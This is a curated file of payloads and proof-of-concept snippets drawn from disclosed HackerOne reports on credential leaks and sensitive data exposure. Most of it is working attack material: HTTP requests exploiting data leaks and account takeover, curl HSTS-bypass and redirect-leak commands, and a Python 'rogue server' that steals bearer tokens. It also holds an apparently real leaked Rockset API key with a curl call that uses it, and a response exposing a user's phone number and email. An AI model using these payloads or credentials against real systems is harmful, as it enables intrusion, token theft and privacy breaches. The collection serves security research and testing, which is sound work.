# Sensitive Data Exposure & Credential Storage  -  curated payloads & PoCs

Snippets extracted from disclosed HackerOne writeups. For authorized testing only.

## 1. [#1489892](https://hackerone.com/reports/1489892)  -  All user password hash can be seen from admin panel
*medium*

```http
GET /api/users?page=1&userId=&firstName=test&lastName=&email=&partnerOrg=&highSchool= HTTP/2
Host: hackers.upchieve.org
Cookie: connect.sid=s%3AaF9AzSGty6cZOHNTyahImdIzUoSDCWuB.ofJzU1Tr25W2Kd2unMFlpS66K4VsPtK3YE0xmHvUZGU…
X-Csrf-Token: KeypPQND-ch0LQMIPkTckMoZdYHTBgA4Mha0
X-Requested-With: XMLHttpRequest
```

## 2. [#855618](https://hackerone.com/reports/855618)  -  Account takeover intercepting magic link for Arrive app
*low*

```http
POST /graphql HTTP/1.1
Content-Type: application/json
Cookie: _arrive-server_session=2a969ef15e1cc286ca6c5a88433d7173
Host: arrive-server.shopifycloud.com
Content-Length: 346

{"operationName":"VerifyToken","variables":{"token":"TOKENHERE"},"query":"mutation VerifyToken($token: String!) {\n  verifyToken(token: $token) {\n    user {\n      id\n      __typename\n    }\n    userErrors {\n      field\n      message\n      __typename\n    }\n    __typename\n  }\n}\n"}
```

## 3. [#855618](https://hackerone.com/reports/855618)  -  Account takeover intercepting magic link for Arrive app
*low*

```http
POST /graphql HTTP/1.1
Content-Type: application/json
Host: arrive-server.shopifycloud.com
Content-Length: 293

{"operationName":"SendVerificationEmail","variables":{"email":"EMAILHERE"},"query":"mutation SendVerificationEmail($email: String!) {\n  sendVerificationEmail(email: $email) {\n    userErrors {\n      field\n      message\n      __typename\n    }\n    __typename\n  }\n}\n"}
```

## 4. [#902733](https://hackerone.com/reports/902733)  -  Sensitive Info Leak - An Attacker Can Retrieve All the Users Mobile Numbers at https://website-api.production.curve.app/api/waitlist/us
*medium*

```http
POST /api/waitlist/us HTTP/1.1
Host: website-api.production.curve.app
Content-Length: 30
Content-Type: application/json;charset=UTF-8
Origin: https://www.curve.com
Referer: https://www.curve.com/credit?rc=

{"email":"praseudo@gmail.com"}
```

## 5. [#902733](https://hackerone.com/reports/902733)  -  Sensitive Info Leak - An Attacker Can Retrieve All the Users Mobile Numbers at https://website-api.production.curve.app/api/waitlist/us
*medium*

```http
POST /api/waitlist/us HTTP/1.1
Host: website-api.production.curve.app
Content-Length: 30
Content-Type: application/json;charset=UTF-8
Origin: https://www.curve.com
Referer: https://www.curve.com/credit?rc=
```

## 6. [#1547048](https://hackerone.com/reports/1547048)  -  CVE-2022-27776: Auth/cookie leak on redirect
*medium*

```http
GET / HTTP/1.1
Host: hostname.tld:9999
Authorization: secrettoken
Cookie: secretcookie
```

## 7. [#952771](https://hackerone.com/reports/952771)  -  CVE-2019-11250 remains in effect.
*medium*

```golang
// toCurl returns a string that can be run as a command in a terminal (minus the body)
func (r *requestInfo) toCurl() string {
	headers := ""
	for key, values := range r.RequestHeaders {
		for _, value := range values {
			headers += fmt.Sprintf(` -H %q`, fmt.Sprintf("%s: %s", key, value))
		}
	}

	return fmt.Sprintf("curl -k -v -X%s %s '%s'", r.RequestVerb, headers, r.RequestURL)
}
```

## 8. [#895650](https://hackerone.com/reports/895650)  -  [h1-2006 2020]  Chained vulnerabilities lead to account takeover
*critical*

```http
GET /                          200 OK
```

## 9. [#895650](https://hackerone.com/reports/895650)  -  [h1-2006 2020]  Chained vulnerabilities lead to account takeover
*critical*

```
../../redirect?url=https://software.bountypay.h1ctf.com/
```

## 10. [#1177287](https://hackerone.com/reports/1177287)  -  Password reset token leak on third party website via Referer header
*medium*

```http
POST /events/1/NRJS-cb3c976936ae1bbb096?a=429165133&sa=1&v=1194.94d5a62&t=Unnamed%20Transaction&rst=56534&ck=1&ref=https://app.upchieve.org/setpassword/e2d710c6e099bf07d63507602a44c176 HTTP/1.1
Host: bam.nr-data.net
```

## 11. [#1177287](https://hackerone.com/reports/1177287)  -  Password reset token leak on third party website via Referer header
*medium*

```http
POST /events/1/NRJS-cb3c976936ae1bbb096?a=429165133&sa=1&v=1194.94d5a62&t=Unnamed%20Transaction&rst=56534&ck=1&ref=https://app.upchieve.org/setpassword/e2d710c6e099bf07d63507602a44c176 HTTP/1.1
Host: bam.nr-data.net

'''
```

## 12. [#716292](https://hackerone.com/reports/716292)  -  JumpCloud API Key leaked via Open Github Repository.
*critical*

```bash
curl -H "x-api-key: ████████" "https://console.jumpcloud.com/api/systems"
```

## 13. [#716292](https://hackerone.com/reports/716292)  -  JumpCloud API Key leaked via Open Github Repository.
*critical*

```bash
curl -H "x-api-key: █████" "https://console.jumpcloud.com/api/systemusers"
```

## 14. [#895650](https://hackerone.com/reports/895650)  -  [h1-2006 2020]  Chained vulnerabilities lead to account takeover
*critical*

```json
{"account_id":"../../redirect?url=https://software.bountypay.h1ctf.com/","hash":"de235bffd23df6995ad4e0930baac1a2"}
```

## 15. [#469668](https://hackerone.com/reports/469668)  -  Passwords being stored as plain text in logging
*low*

```json
[ocs_api] Error: OCP\AppFramework\OCS\OCSException: Unable to send the invitation mail at <<closure>>

0. /var/www/html/lib/private/AppFramework/Http/Dispatcher.php line 166
                                      vvvvvvvv
   addUser("[redacted]", "[redacted - PASSWORD]", "[redacted]", "[redacted]", [], [], "10 GB", "en")
                                      ^^^^^^^^
1. /var/www/html/lib/private/AppFramework/Http/Dispatcher.php line 99
   executeController(OCA\Provisioning ... {}, "addUser")
2. /var/www/html/lib/private/AppFramework/App.php line 118
   dispatch(OCA\Provisioning ... {}, "addUser")
3. /var/www/html/lib/private/AppFramework/Routing/RouteActionHandler.php line 47
   main("OCA\\Provisioni ... r", "addUser", OC\AppFramework\ ... {}, {_route: "ocs.pr ... "})
4. <<closure>>
   __invoke({_route: "ocs.pr ... "})
5. /var/www/html/lib/private/Route/Router.php line 297
   call_user_func(OC\AppFramework\ ... {}, {_route: "ocs.pr ... "})
6. /var/www/html/ocs/v1.php line 82
   match("/ocsapp/cloud/users")
7. /var/www/html/ocs/v2.php line 24
   require_once("/var/www/html/ocs/v1.php")

POST /ocs/v2.php/cloud/users
from 172.18.0.4 by [redacted] at 2018-12-17T19:38:41+00:00
```

## 16. [#469668](https://hackerone.com/reports/469668)  -  Passwords being stored as plain text in logging
*low*

```http
POST /ocs/v2.php/cloud/users
```

## 17. [#1094151](https://hackerone.com/reports/1094151)  -  Leaking Rockset API key on Github
*high*

```bash
curl --request GET \
    --url https://api.rs2.usw2.rockset.com/v1/orgs/self/users/self/apikeys \
    -H 'Authorization: ApiKey skZMJRZSXLZZj5HAdBjNxUfZbarWV5dLqfVO6U623zW5KROzfY0vNRa22ToZfRRe'
```

## 18. [#1730660](https://hackerone.com/reports/1730660)  -  CVE-2022-42916: HSTS bypass via IDN
*medium*

```
# curl -v --hsts hsts.txt http://accounts.google.com。
*   Trying 142.251.42.141:80...
* Connected to accounts.google.com。 (142.251.42.141) port 80 (#0)
> GET / HTTP/1.1
> Host: accounts.google.com.
> User-Agent: curl/7.85.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 301 Moved Permanently
< Cache-Control: private
< Content-Type: text/html; charset=UTF-8
< Referrer-Policy: no-referrer
< Location: http://accounts.google.com/
< Content-Length: 224
< Date: Tue, 11 Oct 2022 16:28:28 GMT
<
<HTML><HEAD><meta http-equiv="content-type" content="text/html;charset=utf-8">
<TITLE>301 Moved</TITLE></HEAD><BODY>
<H1>301 Moved</H1>
The document has moved
<A HREF="http://accounts.google.com/">here</A>.
</BODY></HTML>
* Connection #0 to host accounts.google.com。 left intact
```

## 19. [#895650](https://hackerone.com/reports/895650)  -  [h1-2006 2020]  Chained vulnerabilities lead to account takeover
*critical*

```
HTTP Requests                                                                                                                                                                                     
-------------                                                                                                                                                                                     
                                                                                                                                                                                                  
GET /                          200 OK
```

## 20. [#2236133](https://hackerone.com/reports/2236133)  -  CVE-2023-46219: HSTS long file name clears contents
*low*

```bash
$ cat ok.hsts.txt
# Your HSTS cache. https://curl.se/docs/hsts.html
# This file was generated by libcurl! Edit at your own risk.
cxsecurity.com "20241031 12:12:12"
                                                                                                                                                  
$ curl --hsts ok.hsts.txt http://cxsecurity.com -v
* Switched from HTTP to HTTPS due to HSTS => https://cxsecurity.com/
*   Trying 188.114.97.1:443...
…
```

## 21. [#2236133](https://hackerone.com/reports/2236133)  -  CVE-2023-46219: HSTS long file name clears contents
*low*

```bash
$ curl --hsts ok.hsts.txt https://facebook.com -v 
*   Trying 31…
* Connected to facebook.com …
…
< Strict-Transport-Security: max-age=15552000; preload
…
                                                                                                                                                                  
$ cat ok.hsts.txt                                
# Your HSTS cache. https://curl.se/docs/hsts.html
# This file was generated by libcurl! Edit at your own risk.
cxsecurity.com "20241031 12:12:12"
facebook.com "20240430 00:11:44"
```

## 22. [#2236133](https://hackerone.com/reports/2236133)  -  CVE-2023-46219: HSTS long file name clears contents
*low*

```bash
$ cat hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.txt
# Your HSTS cache. https://curl.se/docs/hsts.html
# This file was generated by libcurl! Edit at your own risk.
cxsecurity.com "20241031 12:12:12"
facebook.com "20240430 00:11:44"

$ curl --hsts hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.txt https://facebook.com -v 
*   Trying …
* Connected to facebook.com …
…
```

## 23. [#3459417](https://hackerone.com/reports/3459417)  -  CVE-2025-14524: bearer token leak on cross-protocol redirect
*low*

```bash
curl 8.5.0 (x86_64-pc-linux-gnu) libcurl/8.5.0 OpenSSL/3.0.13 zlib/1.3 brotli/1.1.0 zstd/1.5.5 libidn2/2.3.7 libpsl/0.21.2 (+libidn2/2.3.7) libssh/0.10.6/openssl/zlib nghttp2/1.59.0 librtmp/2.3 OpenLDAP/2.6.7
Release-Date: 2023-12-06, security patched: 8.5.0-2ubuntu10.6
Protocols: dict file ftp ftps gopher gophers http https imap imaps ldap ldaps mqtt pop3 pop3s rtmp rtsp scp sftp smb smbs smtp smtps telnet tftp
Features: alt-svc AsynchDNS brotli GSS-API HSTS HTTP2 HTTPS-proxy IDN IPv6 Kerberos Largefile libz NTLM PSL SPNEGO SSL threadsafe TLS-SRP UnixSockets zstd
```

## 24. [#3459417](https://hackerone.com/reports/3459417)  -  CVE-2025-14524: bearer token leak on cross-protocol redirect
*low*

```
python3 rogue_server.py
[HTTP] Redirector listening on 127.0.0.1:8080
[IMAP] Stealer listening on 127.0.0.1:1430
[HTTP] Sent 301 Redirect to imap://victim@127.0.0.1:1430/
[IMAP] Victim connected from ('127.0.0.1', 36232)
[IMAP] Received: B001 CAPABILITY
[IMAP] Received: B002 AUTHENTICATE XOAUTH2

==================================================
[!!!] STOLEN TOKEN: dXNlcj12aWN0aW0BYXV0aD1CZWFyZXIgTVlfU0VDUkVUX0dPTERFTl9USUNLRVQBAQ==
==================================================
```

## 25. [#3621851](https://hackerone.com/reports/3621851)  -  CVE-2026-4873: connection reuse ignores TLS requirement
*low*

```bash
curl -sv \
  -u alice:pw \
  --url 'imap://127.0.0.1:2525/Box/;MAILINDEX=1' \
  --ssl-reqd
```

## 26. [#3621851](https://hackerone.com/reports/3621851)  -  CVE-2026-4873: connection reuse ignores TLS requirement
*low*

```bash
curl -sv \
  -u alice:pw \
  --url 'imap://127.0.0.1:2525/' \
  -X NOOP \
  --next \
  -sv \
  -u alice:pw \
  --url 'imap://127.0.0.1:2525/Box/;MAILINDEX=1' \
  --ssl-reqd
```

## 27. [#469668](https://hackerone.com/reports/469668)  -  Passwords being stored as plain text in logging
*low*

```json
[ocs_api] Error: Swift_TransportException: Connection could not be established with host 127.0.0.1 [Connection refused #111] at <<closure>>

 0. /var/www/html/3rdparty/swiftmailer/swiftmailer/lib/classes/Swift/Transport/StreamBuffer.php line 58
    establishSocketConnection()
 1. /var/www/html/3rdparty/swiftmailer/swiftmailer/lib/classes/Swift/Transport/AbstractSmtpTransport.php line 143
    initialize({protocol: "",ho ... ]})
 2. /var/www/html/3rdparty/swiftmailer/swiftmailer/lib/classes/Swift/Mailer.php line 65
    start()
 3. /var/www/html/lib/private/Mail/Mailer.php line 180
    send(Swift_Message {}, [])
 4. /var/www/html/settings/Mailer/NewUserMailHelper.php line 169
    send(OC\Mail\Message {})
 5. /var/www/html/apps/provisioning_api/lib/Controller/UsersController.php line 307
    sendMail(OC\User\User {}, OC\Mail\EMailTemplate {})
 6. /var/www/html/lib/private/AppFramework/Http/Dispatcher.php line 166
                                       vvvvvvvv
    addUser("[redacted]", "[redacted - PASSWORD]", "[redacted]", "[redacted]", [], [], "10 GB", "en")
                                       ^^^^^^^^
 7. /var/www/html/lib/private/AppFramework/Http/Dispatcher.php line 99
    executeController(OCA\Provisioning ... {}, "addUser")
 8. /var/www/html/lib/private/AppFramework/App.php line 118
    dispatch(OCA\Provisioning ... {}, "addUser")
 9. /var/www/html/lib/private/AppFramework/Routing/RouteActionHandler.php line 47
    main("OCA\\Provisioni ... r", "addUser", OC\AppFramework\ ... {}, {_route: "ocs.pr ... "})
10. <<closure>>
    __invoke({_route: "ocs.pr ... "})
11. /var/www/html/lib/private/Route/Router.php line 297
    call_user_func(OC\AppFramework\ ... {}, {_route: "ocs.pr ... "})
12. /var/www/html/ocs/v1.php line 82
    match("/ocsapp/cloud/users")
13. /var/www/html/ocs/v2.php line 24
    require_once("/var/www/html/ocs/v1.php")

POST /ocs/v2.php/cloud/users
from 172.18.0.4 by [redacted] at 2018-12-17T19:38:41+00:00
# … truncated …
```

## 28. [#952771](https://hackerone.com/reports/952771)  -  CVE-2019-11250 remains in effect.
*medium*

```golang
func (rt *debuggingRoundTripper) RoundTrip(req *http.Request) (*http.Response, error) {
	reqInfo := newRequestInfo(req)

	if rt.levels[debugJustURL] {
		klog.Infof("%s %s", reqInfo.RequestVerb, reqInfo.RequestURL)
	}
	if rt.levels[debugCurlCommand] {
		klog.Infof("%s", reqInfo.toCurl())
	}
	if rt.levels[debugRequestHeaders] {
		klog.Infof("Request Headers:")
		for key, values := range reqInfo.RequestHeaders {
			for _, value := range values {
				value = maskValue(key, value)
				klog.Infof("    %s: %s", key, value)
			}
		}
	}
	// <function continues>
}
```

## 29. [#638635](https://hackerone.com/reports/638635)  -  Insecure Zendesk SSO implementation by generating JWT client-side
*high*

```
${user.profile.firstName}
```

## 30. [#638635](https://hackerone.com/reports/638635)  -  Insecure Zendesk SSO implementation by generating JWT client-side
*high*

```
${user.profile.lastName}
```

## 31. [#638635](https://hackerone.com/reports/638635)  -  Insecure Zendesk SSO implementation by generating JWT client-side
*high*

```
${ZENDESK_DOMAIN}
```

## 32. [#638635](https://hackerone.com/reports/638635)  -  Insecure Zendesk SSO implementation by generating JWT client-side
*high*

```
${zendeskToken}
```

## 33. [#895650](https://hackerone.com/reports/895650)  -  [h1-2006 2020]  Chained vulnerabilities lead to account takeover
*critical*

```json
[remote "origin"]
url = https://github.com/bounty-pay-code/request-logger.git
fetch = +refs/heads/*:refs/remotes/origin/*
```

## 34. [#895650](https://hackerone.com/reports/895650)  -  [h1-2006 2020]  Chained vulnerabilities lead to account takeover
*critical*

```javascript
Java.performNow(function() {
   Java.use("com.google.firebase.database.DataSnapshot").getValue.overload().implementation = function() {
    var result = this.getValue()
    console.log(result)
    return result
  }
}, 0)
```

## 35. [#972561](https://hackerone.com/reports/972561)  -  kubeadm logs tokens before deleting them
*low*

```go
// RunDeleteTokens removes a bootstrap tokens from the server.
func RunDeleteTokens(out io.Writer, client clientset.Interface, tokenIDsOrTokens []string) error {
	for _, tokenIDOrToken := range tokenIDsOrTokens {
		// Assume this is a token id and try to parse it
		tokenID := tokenIDOrToken
		klog.V(1).Infof("[token] parsing token %q", tokenIDOrToken) // POTENTIAL LEAK HERE
		if !bootstraputil.IsValidBootstrapTokenID(tokenIDOrToken) {
			// Okay, the full token with both id and secret was probably passed. Parse it and extract the ID only
			bts, err := kubeadmapiv1beta2.NewBootstrapTokenString(tokenIDOrToken)
			if err != nil {
				return errors.Errorf("given token %q didn't match pattern %q or %q",
					tokenIDOrToken, bootstrapapi.BootstrapTokenIDPattern, bootstrapapi.BootstrapTokenIDPattern)
			}
			tokenID = bts.ID
		}

		tokenSecretName := bootstraputil.BootstrapTokenSecretName(tokenID)
		klog.V(1).Infof("[token] deleting token %q", tokenID)
		if err := client.CoreV1().Secrets(metav1.NamespaceSystem).Delete(context.TODO(), tokenSecretName, metav1.DeleteOptions{}); err != nil {
			return errors.Wrapf(err, "failed to delete bootstrap token %q", tokenID)
		}
		fmt.Fprintf(out, "bootstrap token %q deleted\n", tokenID)
	}
	return nil
}
# … truncated …
```

## 36. [#612231](https://hackerone.com/reports/612231)  -  Github Token Leaked publicly for https://github.com/mopub
*medium*

```
${NETWORKS[@]}
```

## 37. [#638635](https://hackerone.com/reports/638635)  -  Insecure Zendesk SSO implementation by generating JWT client-side
*high*

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1NjI3MDk2NTksImp0aSI6IjIxZDAyOTg3LWU3YWItNDQ5MC05N2Q3LTc2YTBmMzJhOTVjOCIsIm5hbWUiOiJUZXN0IFRlc3QiLCJlbWFpbCI6ImIzODcxNjk0QHVyaGVuLmNvbSJ9.mnnx7dbpXbvU7xr5Bp5pad2eHVN01mSsXApmZoFj73c
```

## 38. [#1543773](https://hackerone.com/reports/1543773)  -  CVE-2022-27774: Credential leak on redirect
*high*

```
RewriteCond %{HTTP_USER_AGENT} "^curl/"
    RewriteRule ^/redirectpoc ftp://secondsite.tld:9999 [R=301,L]
```

## 39. [#1773895](https://hackerone.com/reports/1773895)  -  Leak of sensitive values to Airflow rendered template
*low, $480*

```json
{{ conn.secret.password }}
```

## 40. [#983331](https://hackerone.com/reports/983331)  -  Public and secret api key leaked  in JavaScript source
*medium*

```javascript
projectId: null,
userFullName: null,
unSubscribeLink: null,
viewInBrowserLink: null,
initialTab: i.TAB_NAME_CONTENT,
aviaryApiKey: "████████",
youtubeApiKey: "███████",
onChangeFromCodeEditor: null,
onSaveEmail: null,
onSaveTemplate: null,
onUnauthorized: function(e)
```

## 41. [#1987680](https://hackerone.com/reports/1987680)  -  Leaking VPN traffic through non-RFC1918 local IP addresses
*medium*

```
sudo ./vpn_tester.sh wlan0 wlan0 testnetwork abcdefgh --vpn-local nyu.edu
```

## 42. [#1547048](https://hackerone.com/reports/1547048)  -  CVE-2022-27776: Auth/cookie leak on redirect
*medium*

```
RewriteCond %{HTTP_USER_AGENT} "^curl/"
   RewriteRule ^/redirectpoc http://hostname.tld:9999 [R=301,L]
```

## 43. [#1755083](https://hackerone.com/reports/1755083)  -  CVE-2022-43551: Another HSTS bypass via IDN
*medium*

```
C:\test\curl-7.86.0-win64-mingw\bin>curl -v --hsts hsts.txt http://accounts.google%E3%80%82com --head
*   Trying 142.250.206.237:80...
* Connected to accounts.google縲Ｄom (142.250.206.237) port 80 (#0)
> HEAD / HTTP/1.1
> Host: accounts.google.com
> User-Agent: curl/7.86.0
> Accept: */*
>
```

## 44. [#1755083](https://hackerone.com/reports/1755083)  -  CVE-2022-43551: Another HSTS bypass via IDN
*medium*

```
# Your HSTS cache. https://curl.se/docs/hsts.html
# This file was generated by libcurl! Edit at your own risk.
.accounts.google。com "20231029 15:57:29"
```

## 45. [#1730660](https://hackerone.com/reports/1730660)  -  CVE-2022-42916: HSTS bypass via IDN
*medium*

```
# Your HSTS cache. https://curl.se/docs/hsts.html
# This file was generated by libcurl! Edit at your own risk.
.accounts.google.com "20231011 14:44:21"
```

## 46. [#895650](https://hackerone.com/reports/895650)  -  [h1-2006 2020]  Chained vulnerabilities lead to account takeover
*critical*

```bash
$ jadx-gui BountyPay.apk
```

## 47. [#895650](https://hackerone.com/reports/895650)  -  [h1-2006 2020]  Chained vulnerabilities lead to account takeover
*critical*

```bash
$ adb install -r -t BountyPay.apk
```

## 48. [#895650](https://hackerone.com/reports/895650)  -  [h1-2006 2020]  Chained vulnerabilities lead to account takeover
*critical*

```java
getSharedPreferences(KEY_USERNAME, 0).contains("USERNAME")
```

## 49. [#895650](https://hackerone.com/reports/895650)  -  [h1-2006 2020]  Chained vulnerabilities lead to account takeover
*critical*

```java
getIntent() != null && getIntent().getData() != null && (firstParam = getIntent().getData().getQueryParameter("start")) != null && firstParam.equals("PartTwoActivity") && settings.contains("USERNAME")
```

## 50. [#895650](https://hackerone.com/reports/895650)  -  [h1-2006 2020]  Chained vulnerabilities lead to account takeover
*critical*

```bash
$ adb shell am start -a "android.intent.action.VIEW" -d "one://part/?start=PartTwoActivity"
```

## 51. [#895650](https://hackerone.com/reports/895650)  -  [h1-2006 2020]  Chained vulnerabilities lead to account takeover
*critical*

```bash
$ adb shell am start -a "android.intent.action.VIEW" -d "two://part/?two=light\&switch=on"
```

## 52. [#895650](https://hackerone.com/reports/895650)  -  [h1-2006 2020]  Chained vulnerabilities lead to account takeover
*critical*

```bash
$ frida -U -l bounty_app.js --no-paus -f bounty.pay
     ____
    / _  |   Frida 12.8.9 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   More info at https://www.frida.re/docs/home/
Spawned `bounty.pay`. Resuming main thread!                             
[HTC m8::bounty.pay]-> Token
```

## 53. [#895650](https://hackerone.com/reports/895650)  -  [h1-2006 2020]  Chained vulnerabilities lead to account takeover
*critical*

```bash
$ adb shell am start -a "android.intent.action.VIEW" -d "three://part/?three=UGFydFRocmVlQWN0aXZpdHk\=\&switch=b24\=\&header=X-Token"
```

## 54. [#895650](https://hackerone.com/reports/895650)  -  [h1-2006 2020]  Chained vulnerabilities lead to account takeover
*critical*

```bash
$ adb shell input text 8e9998ee3137ca9ade8f372739f062c1
```

## 55. [#895650](https://hackerone.com/reports/895650)  -  [h1-2006 2020]  Chained vulnerabilities lead to account takeover
*critical*

```bash
$ ./ngrok http 8080
```

## 56. [#1773895](https://hackerone.com/reports/1773895)  -  Leak of sensitive values to Airflow rendered template
*low, $480*

```
t1 = BashOperator( 

        task_id="masked-in-rendered-template", 

        bash_command="echo {{ conn.secret.password }}", 

    ) 
        

    t2 = BashOperator( 

        task_id="not-masked-in-rendered-template", 

        depends_on_past=True, 

        bash_command="echo {{ conn.secret.password }}",         

        #bash_command="fail {{ conn.secret.password }}" 

    ) 


    t1 >> t2
```

## 57. [#3459417](https://hackerone.com/reports/3459417)  -  CVE-2025-14524: bearer token leak on cross-protocol redirect
*low*

```python
import socket
import threading
import re

def http_redirector():
    host = '127.0.0.1'
    port = 8080
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host, port))
        s.listen(1)
        print(f"[HTTP] Redirector listening on {host}:{port}")
        conn, addr = s.accept()
        with conn:
            req = conn.recv(1024)
            # ASTUCE : On redirige vers "imap://victim@..."
            # Cela donne à curl un utilisateur pour la nouvelle connexion,
            # ce qui lui permet de tenter l'auth SASL avec le token "oublié".
            redirect = (
                "HTTP/1.1 301 Moved Permanently\r\n"
                "Location: imap://victim@127.0.0.1:1430/\r\n"
                "Content-Length: 0\r\n\r\n"
            )
            conn.sendall(redirect.encode())
            print("[HTTP] Sent 301 Redirect to imap://victim@127.0.0.1:1430/")

def imap_stealer():
    host = '127.0.0.1'
    port = 1430
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host, port))
        s.listen(1)
        print(f"[IMAP] Stealer listening on {host}:{port}")
        
# … truncated …
```

## 58. [#902733](https://hackerone.com/reports/902733)  -  Sensitive Info Leak - An Attacker Can Retrieve All the Users Mobile Numbers at https://website-api.production.curve.app/api/waitlist/us
*medium*

```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 268
Connection: close
access-control-allow-origin: *
x-dns-prefetch-control: off
x-frame-options: SAMEORIGIN
strict-transport-security: max-age=15552000; includeSubDomains
x-download-options: noopen
x-content-type-options: nosniff
x-xss-protection: 1; mode=block
etag: W/"10c-Qj52/PIteKYG+1CbKaOCNpKyiDo"
date: Fri, 19 Jun 2020 09:41:26 GMT
x-envoy-upstream-service-time: 3
x-envoy-peer-metadata: Ch4KDElOU1RBTkNFX0lQUxIOGgwxMC4wLjE1Mi4yMDEK0AEKBkxBQkVMUxLFASrCAQoUCgNhcHASDRoLd2Vic2l0ZS1hcGkKIQoRcG9kLXRlbXBsYXRlLWhhc2gSDBoKN2Q5NzRmNTQ3NQokChlzZWN1cml0eS5pc3Rpby5pby90bHNNb2RlEgcaBWlzdGlvCjAKH3NlcnZpY2UuaXN0aW8uaW8vY2Fub25pY2FsLW5hbWUSDRoLd2Vic2l0ZS1hcGkKLwojc2VydmljZS5pc3Rpby5pby9jYW5vbmljYWwtcmV2aXNpb24SCBoGbGF0ZXN0ChoKB01FU0hfSUQSDxoNY2x1c3Rlci5sb2NhbAomCgROQU1FEh4aHHdlYnNpdGUtYXBpLTdkOTc0ZjU0NzUtZHRuZzgKGQoJTkFNRVNQQUNFEgwaCnByb2R1Y3Rpb24KUgoFT1dORVISSRpHa3ViZXJuZXRlczovL2FwaXMvYXBwcy92MS9uYW1lc3BhY2VzL3Byb2R1Y3Rpb24vZGVwbG95bWVudHMvd2Vic2l0ZS1hcGkKHwoPU0VSVklDRV9BQ0NPVU5UEgwaCnZhdWx0LWF1dGgKHgoNV09SS0xPQURfTkFNRRINGgt3ZWJzaXRlLWFwaQ==
x-envoy-peer-metadata-id: sidecar~10.0.152.201~website-api-7d974f5475-dtng8.production~production.svc.cluster.local
server: envoy
X-Cache: Miss from cloudfront
Via: 1.1 1671dd64160321b1f8979341944a5b14.cloudfront.net (CloudFront)
X-Amz-Cf-Pop: MAA50-C2
X-Amz-Cf-Id: kUgxzRYYQ9rJw0zP7oR4PnDz6Rz4bCc6r30M25JrfmOyzp_xuMEHyA==

{"_id":"5eec6b1a958666b5141063e3","name":"Cxvvc","email":"praseudo@gmail.com","phoneNumber":"7013899887","zipcode":"10001","position":4379,"referralCode":"BCeE8mzI","createdAt":"2020-06-19T07:36:58.460Z","updatedAt":"2020-06-19T07:36:58.460Z","__v":0,"status":"EXIST"}
# … truncated …
```

## 59. [#1755083](https://hackerone.com/reports/1755083)  -  CVE-2022-43551: Another HSTS bypass via IDN
*medium*

```
CURLcode check =
      Curl_hsts_parse(data->hsts, data->state.up.hostname,
                      headp + strlen("Strict-Transport-Security:"));
```

## 60. [#2236133](https://hackerone.com/reports/2236133)  -  CVE-2023-46219: HSTS long file name clears contents
*low*

```c
CURLcode Curl_fopen(struct Curl_easy *data, const char *filename, FILE **fh, char **tempname) {
  CURLcode result = CURLE_WRITE_ERROR;
  unsigned char randsuffix[9]; // Random suffix generation <=======
  ...
  tempstore = aprintf("%s.%s.tmp", filename, randsuffix); // Temporary filename creation <=======
  if(!tempstore) {
    result = CURLE_OUT_OF_MEMORY;
    goto fail;
  }
}
```

## 61. [#2236133](https://hackerone.com/reports/2236133)  -  CVE-2023-46219: HSTS long file name clears contents
*low*

```bash
$ cp ok.hsts.txt hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.txt
```

## 62. [#2236133](https://hackerone.com/reports/2236133)  -  CVE-2023-46219: HSTS long file name clears contents
*low*

```bash
$ ls -la hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.txt          
-rw-r--r-- 1 cx cx 179 Nov  1 19:14 hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.txt
```

## 63. [#2236133](https://hackerone.com/reports/2236133)  -  CVE-2023-46219: HSTS long file name clears contents
*low*

```bash
